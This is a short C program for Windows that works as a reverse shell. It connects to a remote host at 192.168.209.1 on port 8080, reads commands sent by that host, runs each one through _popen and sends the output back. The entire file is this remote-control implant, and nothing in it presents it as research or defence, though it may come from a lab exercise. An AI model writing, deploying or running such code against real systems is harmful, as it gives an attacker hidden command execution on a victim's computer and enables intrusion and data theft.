#include <winsock2.h>
#include <ws2tcpip.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int main() {
  WSADATA wsa;
  WSAStartup(MAKEWORD(2,2), &wsa);


  SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);

  if (sock == INVALID_SOCKET) {
    printf("Could not create socket. Error: %d\n", WSAGetLastError());
    WSACleanup();
    return 1;
  }

  // Server address to connect to
  struct sockaddr_in server_addr;
  memset(&server_addr, 0, sizeof(server_addr));

  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(8080);
  inet_pton(AF_INET, "192.168.209.1", &server_addr.sin_addr);

  // Connect to remote service
  if (connect(sock, &server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
    
    printf("Unable to connect: %d\n", WSAGetLastError());
    closesocket(sock);
    WSACleanup();
    return 1;
  }


  char recv_buffer[1024];
  int recv_len = 0;

  char cmd[1024];

  while (1) {

    int n = recv(sock, recv_buffer + recv_len, sizeof(recv_buffer) - 1 - recv_len, 0);


    if (n > 0) {

      recv_len += n;
      char *newline;

      while ((newline = memchr(recv_buffer, '\n', recv_len)) != NULL) {
        int cmd_len = newline - recv_buffer;

        // Copy command i.e. bytes up to \n delimiter from recv_buffer into cmd buffer
        memcpy(cmd, recv_buffer, cmd_len);
        // Append `\0` to make it a string
        cmd[cmd_len] = '\0';

        printf("Received from server: %s", cmd);

        // Move remaining bytes back to the start of recv_buffer
        memmove(recv_buffer, recv_buffer + cmd_len + 1, recv_len - (cmd_len + 1));
        recv_len = recv_len - (cmd_len + 1);
        


        // Perform received command
        FILE *fp = _popen(cmd, "r");

        char output[4096];
        size_t len = fread(output, 1, sizeof(output)-1, fp);

        output[len] = '\0';
        _pclose(fp);

        printf("OUTPUT: %s", output);

        send(sock, output, strlen(output), 0);

      }

    } else {
        closesocket(sock);
        WSACleanup();
        break;
    }
  }
}